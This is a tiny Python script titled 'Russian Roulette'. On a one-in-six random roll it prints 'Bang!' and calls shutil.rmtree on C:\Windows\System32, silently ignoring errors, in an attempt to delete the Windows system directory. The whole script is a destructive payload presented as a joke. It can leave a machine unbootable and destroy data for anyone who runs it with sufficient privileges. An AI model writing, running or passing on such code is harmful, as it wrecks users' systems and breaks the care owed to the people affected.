# Russian Roulette
import random
import shutil


if random.randint(1, 6) == 1:
    
    print("Bang!")
    # Delete all files and folders in Windows\System32
    shutil.rmtree(r'c:\Windows\System32', ignore_errors=True)